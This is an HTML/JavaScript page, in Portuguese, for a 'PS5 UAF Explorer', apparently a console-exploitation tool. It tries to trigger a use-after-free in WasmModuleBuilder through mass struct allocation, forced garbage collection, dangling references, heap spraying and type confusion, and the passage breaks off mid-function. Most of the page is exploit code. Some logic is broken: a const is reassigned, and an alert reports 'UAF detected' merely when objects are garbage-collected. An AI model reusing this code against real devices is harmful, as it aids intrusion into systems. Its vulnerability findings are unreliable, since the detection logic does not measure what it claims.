<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS5 UAF Explorer - Use-After-Free Test</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0c2461 0%, #1e3799 100%);
            min-height: 100vh;
            padding: 20px;
            color: white;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(30, 30, 46, 0.95);
            border-radius: 20px;
            box-shadow: 0 25px 75px rgba(0,0,0,0.5);
            overflow: hidden;
            backdrop-filter: blur(10px);
        }
        
        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            padding: 40px;
            text-align: center;
            border-bottom: 3px solid #00ff9d;
        }
        
        .header h1 {
            font-size: 2.8em;
            margin-bottom: 15px;
            color: #00ff9d;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .header p {
            font-size: 1.2em;
            opacity: 0.9;
            max-width: 800px;
            margin: 0 auto;
        }
        
        .status-badges {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 25px;
            flex-wrap: wrap;
        }
        
        .badge {
            padding: 12px 25px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 1.1em;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .badge-success {
            background: #00ff9d;
            color: #1a1a2e;
        }
        
        .badge-warning {
            background: #ffd700;
            color: #1a1a2e;
        }
        
        .badge-danger {
            background: #ff416c;
            color: white;
        }
        
        .content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0;
            min-height: 800px;
        }
        
        @media (max-width: 1024px) {
            .content {
                grid-template-columns: 1fr;
            }
        }
        
        .control-panel {
            padding: 40px;
            background: rgba(26, 26, 46, 0.8);
            border-right: 2px solid #2a2a3e;
        }
        
        .console-panel {
            background: #1e1e1e;
            display: flex;
            flex-direction: column;
        }
        
        .panel-title {
            font-size: 1.8em;
            margin-bottom: 30px;
            color: #00ff9d;
            padding-bottom: 15px;
            border-bottom: 2px solid #00ff9d;
        }
        
        .console-title {
            background: #252526;
            color: #fff;
            padding: 25px;
            font-size: 1.4em;
            font-weight: bold;
            border-bottom: 2px solid #3e3e42;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .console-output {
            flex: 1;
            padding: 25px;
            overflow-y: auto;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.6;
            color: #d4d4d4;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .test-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 40px;
        }
        
        .test-card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 25px;
            border: 2px solid transparent;
            transition: all 0.3s;
            cursor: pointer;
        }
        
        .test-card:hover {
            border-color: #00ff9d;
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 255, 157, 0.2);
        }
        
        .test-card h3 {
            color: #00ff9d;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 1.4em;
        }
        
        .test-card p {
            color: #aaa;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        
        .phase-container {
            margin: 40px 0;
        }
        
        .phase-title {
            font-size: 1.6em;
            color: #ffd700;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #ffd700;
        }
        
        .progress-container {
            margin: 30px 0;
        }
        
        .progress-label {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 1.1em;
            color: #aaa;
        }
        
        .progress-bar {
            height: 25px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff9d, #00b894);
            width: 0%;
            transition: width 0.5s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #1a1a2e;
            font-weight: bold;
            font-size: 0.9em;
        }
        
        .memory-visualization {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
            border: 2px solid #00ff9d;
        }
        
        .memory-title {
            color: #00ff9d;
            margin-bottom: 15px;
            font-size: 1.3em;
        }
        
        .memory-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 10px;
            margin-top: 15px;
        }
        
        .memory-cell {
            height: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.9em;
            transition: all 0.3s;
        }
        
        .memory-cell.allocated {
            background: #00ff9d;
            color: #1a1a2e;
            font-weight: bold;
        }
        
        .memory-cell.freed {
            background: #ff416c;
            color: white;
        }
        
        .memory-cell.reused {
            background: #ffd700;
            color: #1a1a2e;
            font-weight: bold;
        }
        
        button {
            background: linear-gradient(135deg, #00ff9d 0%, #00b894 100%);
            color: #1a1a2e;
            border: none;
            padding: 18px 35px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 1.2em;
            font-weight: bold;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            width: 100%;
            margin-top: 20px;
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 255, 157, 0.3);
        }
        
        button:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        button.danger {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            color: white;
        }
        
        button.danger:hover {
            box-shadow: 0 10px 30px rgba(255, 65, 108, 0.3);
        }
        
        button.warning {
            background: linear-gradient(135deg, #ffd700 0%, #f7971e 100%);
            color: #1a1a2e;
        }
        
        .log-entry {
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        
        .log-timestamp {
            color: #6a9955;
            font-size: 0.9em;
            margin-right: 15px;
        }
        
        .log-type-info { color: #9cdcfe; }
        .log-type-success { color: #00ff9d; }
        .log-type-warning { color: #ffd700; }
        .log-type-error { color: #ff416c; }
        .log-type-critical { color: #ff0066; }
        
        .stats-panel {
            background: rgba(0, 255, 157, 0.1);
            border-radius: 15px;
            padding: 25px;
            margin-top: 30px;
            border: 2px solid #00ff9d;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-value {
            font-size: 2.5em;
            font-weight: bold;
            color: #00ff9d;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #aaa;
            font-size: 1em;
        }
        
        .vulnerability-indicator {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            background: rgba(255, 65, 108, 0.9);
            color: white;
            border-radius: 10px;
            font-weight: bold;
            display: none;
            z-index: 10000;
            box-shadow: 0 5px 20px rgba(255, 65, 108, 0.5);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .code-snippet {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 20px;
            border-radius: 10px;
            overflow-x: auto;
            margin: 20px 0;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            border-left: 5px solid #00ff9d;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üí• PS5 UAF Explorer - Use-After-Free</h1>
            <p>Testando vulnerabilidade de Use-After-Free no WasmModuleBuilder do PS5</p>
            
            <div class="status-badges">
                <div class="badge badge-success">
                    <span>‚úÖ</span> WasmModuleBuilder Dispon√≠vel
                </div>
                <div class="badge badge-warning">
                    <span>‚ö†Ô∏è</span> 11 M√©todos Detectados
                </div>
                <div class="badge badge-danger">
                    <span>üí£</span> UAF Suspeitado
                </div>
            </div>
        </div>
        
        <div class="content">
            <!-- Painel de Controle -->
            <div class="control-panel">
                <h2 class="panel-title">üéÆ Controle de Explora√ß√£o UAF</h2>
                
                <div class="phase-container">
                    <h3 class="phase-title">üéØ Fase 1: Aloca√ß√£o de Objetos</h3>
                    <div class="test-grid">
                        <div class="test-card" onclick="runPhase1('structs')">
                            <h3>üèóÔ∏è Alocar Structs</h3>
                            <p>Criar m√∫ltiplas structs para ocupar mem√≥ria espec√≠fica.</p>
                        </div>
                        <div class="test-card" onclick="runPhase1('globals')">
                            <h3>üîó Alocar Globals</h3>
                            <p>Criar globais com refer√™ncias √†s structs.</p>
                        </div>
                    </div>
                </div>
                
                <div class="phase-container">
                    <h3 class="phase-title">üíÄ Fase 2: Libera√ß√£o Controlada</h3>
                    <div class="test-grid">
                        <div class="test-card" onclick="runPhase2('gc')">
                            <h3>‚ôªÔ∏è For√ßar Garbage Collection</h3>
                            <p>Liberar mem√≥ria mantendo refer√™ncias.</p>
                        </div>
                        <div class="test-card" onclick="runPhase2('null')">
                            <h3>üóëÔ∏è Nullificar Refer√™ncias</h3>
                            <p>Remover refer√™ncias para trigger de UAF.</p>
                        </div>
                    </div>
                </div>
                
                <div class="phase-container">
                    <h3 class="phase-title">üé™ Fase 3: Reutiliza√ß√£o de Mem√≥ria</h3>
                    <div class="test-grid">
                        <div class="test-card" onclick="runPhase3('spray')">
                            <h3>üìä Heap Spraying</h3>
                            <p>Preencher mem√≥ria liberada com novos objetos.</p>
                        </div>
                        <div class="test-card" onclick="runPhase3('confusion')">
                            <h3>üé≠ Type Confusion</h3>
                            <p>Criar type confusion na mem√≥ria reutilizada.</p>
                        </div>
                    </div>
                </div>
                
                <div class="progress-container">
                    <div class="progress-label">
                        <span>Progresso da Explora√ß√£o</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                </div>
                
                <button onclick="runFullUAFExploit()" id="fullExploitBtn">
                    <span>üöÄ</span> Executar Explora√ß√£o UAF Completa
                </button>
                
                <button onclick="testUAFDetection()" class="warning" style="margin-top: 15px;">
                    <span>üîç</span> Testar Detec√ß√£o de UAF
                </button>
                
                <button onclick="resetExploration()" class="danger" style="margin-top: 15px;">
                    <span>üîÑ</span> Reiniciar Explora√ß√£o
                </button>
                
                <div class="stats-panel">
                    <h3 style="color: #00ff9d; margin-bottom: 20px;">üìä Estat√≠sticas da Explora√ß√£o</h3>
                    <div class="stats-grid" id="statsGrid">
                        <!-- Estat√≠sticas ser√£o preenchidas dinamicamente -->
                    </div>
                </div>
                
                <div class="memory-visualization">
                    <h3 class="memory-title">üß† Visualiza√ß√£o de Mem√≥ria</h3>
                    <div class="memory-grid" id="memoryGrid">
                        <!-- C√©lulas de mem√≥ria ser√£o preenchidas dinamicamente -->
                    </div>
                </div>
            </div>
            
            <!-- Console -->
            <div class="console-panel">
                <div class="console-title">
                    <span>üì∫ Console de Explora√ß√£o UAF</span>
                    <span style="font-size: 0.9em; color: #ccc;" id="logCount">0 logs</span>
                </div>
                
                <div class="console-output" id="consoleOutput">
                    <div class="log-entry">
                        <span class="log-timestamp">[00:00:00]</span>
                        <span class="log-type-success">üü¢ Sistema UAF Explorer inicializado</span>
                    </div>
                    <div class="log-entry">
                        <span class="log-timestamp">[00:00:00]</span>
                        <span class="log-type-info">üìä Status: WasmModuleBuilder dispon√≠vel (11 m√©todos)</span>
                    </div>
                    <div class="log-entry">
                        <span class="log-timestamp">[00:00:00]</span>
                        <span class="log-type-warning">‚ö†Ô∏è Pr√≥ximo: Testar Use-After-Free em TypeDefinition</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <div id="vulnerabilityAlert" class="vulnerability-indicator">
        üö® VULNERABILIDADE UAF DETECTADA!
    </div>

    <script>
        // ============================================
        // VARI√ÅVEIS GLOBAIS DE EXPLORA√á√ÉO
        // ============================================
        
        let explorationState = {
            phase: 0, // 0: Inicial, 1: Aloca√ß√£o, 2: Libera√ß√£o, 3: Reutiliza√ß√£o
            allocatedStructs: [],
            allocatedGlobals: [],
            references: [],
            memoryLayout: [],
            stats: {
                totalAllocations: 0,
                successfulFrees: 0,
                suspectedUAF: 0,
                typeConfusions: 0,
                gcCalls: 0
            }
        };
        
        let logs = [];
        let progress = 0;
        
        // ============================================
        // SISTEMA DE LOGGING
        // ============================================
        
        function log(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = {
                timestamp,
                message: String(message),
                type
            };
            
            logs.push(logEntry);
            
            const consoleOutput = document.getElementById('consoleOutput');
            const logElement = document.createElement('div');
            logElement.className = 'log-entry';
            
            const typeClass = {
                info: 'log-type-info',
                success: 'log-type-success',
                warning: 'log-type-warning',
                error: 'log-type-error',
                critical: 'log-type-critical'
            }[type];
            
            const typeIcon = {
                info: 'üîµ',
                success: 'üü¢',
                warning: 'üü°',
                error: 'üî¥',
                critical: 'üíÄ'
            }[type];
            
            logElement.innerHTML = `
                <span class="log-timestamp">[${timestamp}]</span>
                <span class="${typeClass}">${typeIcon} ${message}</span>
            `;
            
            consoleOutput.appendChild(logElement);
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
            
            document.getElementById('logCount').textContent = `${logs.length} logs`;
            
            console.log(`[${type.toUpperCase()}] ${message}`);
        }
        
        // ============================================
        // CONTROLE DE PROGRESSO
        // ============================================
        
        function updateProgress(value, message = '') {
            progress = Math.max(0, Math.min(100, value));
            document.getElementById('progressFill').style.width = `${progress}%`;
            document.getElementById('progressPercent').textContent = `${Math.round(progress)}%`;
            
            if (message) {
                log(`Progresso: ${Math.round(progress)}% - ${message}`, 'info');
            }
        }
        
        function updateStats() {
            const statsGrid = document.getElementById('statsGrid');
            const stats = explorationState.stats;
            
            statsGrid.innerHTML = `
                <div class="stat-item">
                    <div class="stat-value">${stats.totalAllocations}</div>
                    <div class="stat-label">Aloca√ß√µes</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">${stats.successfulFrees}</div>
                    <div class="stat-label">Libera√ß√µes</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">${stats.suspectedUAF}</div>
                    <div class="stat-label">UAF Suspeitos</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">${stats.gcCalls}</div>
                    <div class="stat-label">Chamadas GC</div>
                </div>
            `;
        }
        
        // ============================================
        // FASE 1: ALOCA√á√ÉO DE OBJETOS
        // ============================================
        
        async function runPhase1(type) {
            log(`üéØ Iniciando Fase 1: Aloca√ß√£o de ${type}...`, 'warning');
            updateProgress(10, `Alocando ${type}`);
            
            try {
                if (typeof WasmModuleBuilder === 'undefined') {
                    throw new Error('WasmModuleBuilder n√£o dispon√≠vel');
                }
                
                const builder = new WasmModuleBuilder();
                
                if (type === 'structs') {
                    await allocateStructs(builder);
                } else if (type === 'globals') {
                    await allocateGlobals(builder);
                }
                
                explorationState.phase = 1;
                updateProgress(30, `Fase 1 conclu√≠da: ${type} alocados`);
                log(`‚úÖ Fase 1 conclu√≠da: ${explorationState.allocatedStructs.length} structs alocadas`, 'success');
                
            } catch (error) {
                log(`‚ùå Erro na Fase 1: ${error.message}`, 'error');
            }
        }
        
        async function allocateStructs(builder) {
            log('üèóÔ∏è Alocando 1000 structs...', 'info');
            
            // Criar structs com diferentes layouts
            for (let i = 0; i < 1000; i++) {
                try {
                    // Alternar entre layouts diferentes para potencial type confusion
                    const fields = [];
                    const fieldCount = 1 + (i % 5); // 1-5 campos
                    
                    for (let j = 0; j < fieldCount; j++) {
                        const fieldType = 0x7f + (j % 4); // Rotacionar tipos i32, i64, f32, f64
                        fields.push({
                            type: fieldType,
                            mutable: j % 2 === 0
                        });
                    }
                    
                    const structIndex = builder.addStruct(fields);
                    explorationState.allocatedStructs.push({
                        index: structIndex,
                        fields: fields,
                        builder: builder
                    });
                    
                    explorationState.stats.totalAllocations++;
                    
                    if (i % 200 === 0) {
                        updateProgress(10 + (i / 1000 * 15), `Structs: ${i}/1000`);
                        log(`   Progresso: ${i} structs alocadas...`, 'info');
                    }
                } catch (error) {
                    log(`‚ö†Ô∏è Erro na struct ${i}: ${error.message}`, 'warning');
                }
            }
            
            log(`‚úÖ ${explorationState.allocatedStructs.length} structs alocadas com sucesso`, 'success');
            updateMemoryVisualization();
        }
        
        async function allocateGlobals(builder) {
            log('üîó Alocando globais com refer√™ncias...', 'info');
            
            // Primeiro criar uma struct base
            const baseStructIndex = builder.addStruct([
                { type: 0x7f, mutable: true } // i32
            ]);
            
            // Criar globais que referenciam a struct
            for (let i = 0; i < 500; i++) {
                try {
                    const global = builder.addGlobal(
                        {
                            type: 'refnull',
                            heapType: baseStructIndex
                        },
                        true, // mut√°vel
                        false, // n√£o compartilhado
                        [0xd0, ...encodeLEB128(baseStructIndex)] // refnull + type index
                    ).exportAs(`global_ref_${i}`);
                    
                    explorationState.allocatedGlobals.push({
                        index: i,
                        typeIndex: baseStructIndex,
                        reference: global
                    });
                    
                    explorationState.stats.totalAllocations++;
                    
                    if (i % 100 === 0) {
                        updateProgress(10 + (i / 500 * 15), `Globais: ${i}/500`);
                        log(`   Progresso: ${i} globais alocadas...`, 'info');
                    }
                } catch (error) {
                    log(`‚ö†Ô∏è Erro na global ${i}: ${error.message}`, 'warning');
                }
            }
            
            log(`‚úÖ ${explorationState.allocatedGlobals.length} globais alocadas`, 'success');
            updateMemoryVisualization();
        }
        
        // ============================================
        // FASE 2: LIBERA√á√ÉO CONTROLADA
        // ============================================
        
        async function runPhase2(method) {
            log(`üíÄ Iniciando Fase 2: Libera√ß√£o (${method})...`, 'warning');
            updateProgress(40, `Liberando mem√≥ria via ${method}`);
            
            try {
                if (method === 'gc') {
                    await forceGarbageCollection();
                } else if (method === 'null') {
                    await nullifyReferences();
                }
                
                explorationState.phase = 2;
                updateProgress(60, `Fase 2 conclu√≠da: mem√≥ria liberada`);
                log(`‚úÖ Fase 2 conclu√≠da: mem√≥ria pronta para reutiliza√ß√£o`, 'success');
                
            } catch (error) {
                log(`‚ùå Erro na Fase 2: ${error.message}`, 'error');
            }
        }
        
        async function forceGarbageCollection() {
            log('‚ôªÔ∏è For√ßando Garbage Collection...', 'critical');
            
            // Manter refer√™ncias fracas aos objetos
            const weakRefs = explorationState.allocatedStructs.map(s => 
                new WeakRef(s.builder)
            );
            
            // Liberar refer√™ncias fortes
            explorationState.allocatedStructs.length = 0;
            explorationState.allocatedGlobals.length = 0;
            
            log('   Refer√™ncias fortes liberadas', 'info');
            
            // Tentar for√ßar GC de v√°rias formas
            let gcPerformed = false;
            
            // M√©todo 1: gc() nativo (se dispon√≠vel)
            if (typeof gc !== 'undefined') {
                try {
                    gc();
                    log('   ‚úÖ gc() nativo executado', 'success');
                    gcPerformed = true;
                    explorationState.stats.gcCalls++;
                } catch (e) {
                    log(`   ‚ö†Ô∏è gc() falhou: ${e.message}`, 'warning');
                }
            }
            
            // M√©todo 2: window.gc (Chrome com flag)
            if (!gcPerformed && window.gc) {
                try {
                    window.gc();
                    log('   ‚úÖ window.gc() executado', 'success');
                    gcPerformed = true;
                    explorationState.stats.gcCalls++;
                } catch (e) {
                    log(`   ‚ö†Ô∏è window.gc() falhou: ${e.message}`, 'warning');
                }
            }
            
            // M√©todo 3: Fallback - alocar e liberar muita mem√≥ria
            if (!gcPerformed) {
                log('   Usando fallback de GC...', 'warning');
                for (let i = 0; i < 100000; i++) {
                    const temp = new Array(1000).fill({ data: 'gc pressure' });
                    if (i % 20000 === 0) {
                        log(`      ${i/1000}k objetos criados...`, 'info');
                    }
                }
                log('   ‚úÖ Fallback de GC executado', 'success');
                explorationState.stats.gcCalls++;
            }
            
            // Verificar se objetos foram coletados
            setTimeout(() => {
                let collectedCount = 0;
                weakRefs.forEach(ref => {
                    if (!ref.deref()) collectedCount++;
                });
                
                explorationState.stats.successfulFrees = collectedCount;
                log(`üìä ${collectedCount}/${weakRefs.length} objetos aparentemente coletados`, 
                    collectedCount > 0 ? 'success' : 'warning');
                
                if (collectedCount > 0) {
                    explorationState.stats.suspectedUAF++;
                    showVulnerabilityAlert('POSS√çVEL UAF: Objetos coletados mas mem√≥ria pode ser reutilizada');
                }
            }, 1000);
        }
        
        async function nullifyReferences() {
            log('üóëÔ∏è Nullificando refer√™ncias para trigger de UAF...', 'critical');
            
            // Estrat√©gia: Criar dangling references
            const danglingRefs = [];
            
            // Criar refer√™ncias e depois destruir o objeto dono
            for (let i = 0; i < 100; i++) {
                try {
                    const tempBuilder = new WasmModuleBuilder();
                    const tempStruct = tempBuilder.addStruct([
                        { type: 0x7f, mutable: true }
                    ]);
                    
                    const danglingGlobal = tempBuilder.addGlobal(
                        { type: 'refnull', heapType: tempStruct },
                        true,
                        false,
                        [0xd0, ...encodeLEB128(tempStruct)]
                    );
                    
                    // Guardar refer√™ncia antes de destruir o builder
                    danglingRefs.push({
                        structIndex: tempStruct,
                        globalRef: danglingGlobal
                    });
                    
                    // Destruir o builder mas manter a refer√™ncia √† struct
                    tempBuilder = null;
                    
                    explorationState.references.push({
                        type: 'dangling',
                        index: tempStruct,
                        data: `dangling_${i}`
                    });
                    
                } catch (error) {
                    log(`‚ö†Ô∏è Erro na refer√™ncia ${i}: ${error.message}`, 'warning');
                }
            }
            
            log(`‚úÖ ${danglingRefs.length} refer√™ncias dangling criadas`, 'success');
            explorationState.stats.successfulFrees += danglingRefs.length;
            
            // Esta √© uma condi√ß√£o cl√°ssica para UAF!
            if (danglingRefs.length > 0) {
                explorationState.stats.suspectedUAF++;
                showVulnerabilityAlert('REFER√äNCIAS DANGLING CRIADAS - UAF PROV√ÅVEL');
            }
        }
        
        // ============================================
        // FASE 3: REUTILIZA√á√ÉO DE MEM√ìRIA
        // ============================================
        
        async function runPhase3(method) {
            log(`üé™ Iniciando Fase 3: Reutiliza√ß√£o (${method})...`, 'warning');
            updateProgress(70, `Reutilizando mem√≥ria via ${method}`);
            
            try {
                if (method === 'spray') {
                    await heapSpraying();
                } else if (method === 'confusion') {
                    await typeConfusion();
                }
                
                explorationState.phase = 3;
                updateProgress(90, `Fase 3 conclu√≠da: mem√≥ria reutilizada`);
                log(`‚úÖ Fase 3 conclu√≠da: mem√≥ria potencialmente reutilizada`, 'success');
                
            } catch (error) {
                log(`‚ùå Erro na Fase 3: ${error.message}`, 'error');
            }
        }
        
        async function heapSpraying() {
            log('üìä Executando Heap Spraying...', 'critical');
            
            // Criar muitos objetos para tentar reutilizar mem√≥ria liberada
            const newBuilders = [];
            const newStructs = [];
            
            for (let i = 0; i < 2000; i++) {
                try {
                    const sprayBuilder = new WasmModuleBuilder();
                    
                    // Criar struct com layout diferente
                    const sprayStruct = sprayBuilder.addStruct([
                        { type: 0x7e, mutable: false }, // i64
                        { type: 0x7d, mutable: true }   // f32
                    ]);
                    
                    newBuilders.push(sprayBuilder);
                    newStructs.push({
                        index: sprayStruct,
                        builder: sprayBuilder,
                        iteration: i
                    });
                    
                    if (i % 400 === 0) {
                        updateProgress(70 + (i / 2000 * 15), `Spray: ${i}/2000`);
                        log(`   Progresso: ${i} objetos de spray...`, 'info');
                    }
                } catch (error) {
                    log(`‚ö†Ô∏è Erro no spray ${i}: ${error.message}`, 'warning');
                }
            }
            
            log(`‚úÖ ${newStructs.length} objetos de spray criados`, 'success');
            
            // An√°lise de poss√≠veis colis√µes
            analyzeSprayCollisions(newStructs);
            updateMemoryVisualization();
        }
        
        async function typeConfusion() {
            log('üé≠ Criando Type Confusion...', 'critical');
            
            // Criar structs com layouts similares em diferentes builders
            const builders = [];
            const similarStructs = [];
            
            // Layout A: i32, i64
            // Layout B: i64, i32 (mesmos tipos, ordem diferente)
            
            for (let i = 0; i < 500; i++) {
                try {
                    const builder = new WasmModuleBuilder();
                    
                    // Alternar entre layouts A e B
                    const useLayoutA = i % 2 === 0;
                    const structIndex = useLayoutA ? 
                        builder.addStruct([
                            { type: 0x7f, mutable: true },  // i32
                            { type: 0x7e, mutable: false }  // i64
                        ]) :
                        builder.addStruct([
                            { type: 0x7e, mutable: false }, // i64  
                            { type: 0x7f, mutable: true }   // i32
                        ]);
                    
                    builders.push(builder);
                    similarStructs.push({
                        index: structIndex,
                        layout: useLayoutA ? 'A' : 'B',
                        builder: builder
                    });
                    
                    // Criar global que referencia esta struct
                    builder.addGlobal(
                        { type: 'refnull', heapType: structIndex },
                        true,
                        false,
                        [0xd0, ...encodeLEB128(structIndex)]
                    ).exportAs(`confusion_${i}`);
                    
                    if (i % 100 === 0) {
                        updateProgress(70 + (i / 500 * 15), `Type confusion: ${i}/500`);
                        log(`   Progresso: ${i} structs para confusion...`, 'info');
                    }
                } catch (error) {
                    log(`‚ö†Ô∏è Erro na confusion ${i}: ${error.message}`, 'warning');
                }
            }
            
            log(`‚úÖ ${similarStructs.length} structs para type confusion criadas`, 'success');
            
            // Analisar padr√µes
           
